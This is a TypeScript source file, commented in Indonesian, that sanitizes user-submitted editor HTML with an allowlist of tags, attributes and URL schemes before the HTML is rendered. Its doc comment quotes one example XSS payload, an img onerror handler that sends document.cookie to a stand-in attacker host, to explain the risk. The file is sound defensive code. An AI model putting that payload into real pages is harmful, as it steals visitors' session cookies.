import sanitizeHtml from 'sanitize-html';

/**
 * Saring HTML dari editor sebelum disimpan ke database.
 *
 * KENAPA WAJIB: HTML ini nantinya ditampilkan pakai dangerouslySetInnerHTML,
 * yang mematikan perlindungan bawaan React. Tanpa disaring, satu baris seperti
 *
 *     <img src=x onerror="fetch('https://jahat.com?c='+document.cookie)">
 *
 * bakal jalan di browser SETIAP pengunjung dan bisa mencuri cookie sesi.
 *
 * Pakai daftar-yang-diizinkan (allowlist), bukan daftar-yang-dilarang:
 * apa pun yang tidak disebut di bawah otomatis dibuang. Ini penting — kalau
 * pakai daftar larangan, selalu ada celah yang kelewat.
 */
export function bersihkanHtml(kotor: string): string {
  return sanitizeHtml(kotor, {
    allowedTags: [
      'p', 'br', 'strong', 'em', 'u', 's',
      'h2', 'h3', 'h4',
      'ul', 'ol', 'li',
      'blockquote', 'code', 'pre',
      'a', 'img', 'hr',
    ],
    allowedAttributes: {
      a: ['href', 'target', 'rel'],
      img: ['src', 'alt', 'width', 'height'],
    },
    // Cuma izinkan gambar dari storage sendiri + http(s). Ini menutup
    // celah "data:" URI yang bisa dipakai menyelundupkan skrip.
    allowedSchemes: ['http', 'https', 'mailto'],
    allowedSchemesByTag: { img: ['http', 'https'] },
    // Link ke luar dibuka di tab baru, plus noopener supaya halaman tujuan
    // tidak bisa mengendalikan tab kita.
    transformTags: {
      a: sanitizeHtml.simpleTransform('a', { target: '_blank', rel: 'noopener noreferrer' }),
    },
  });
}
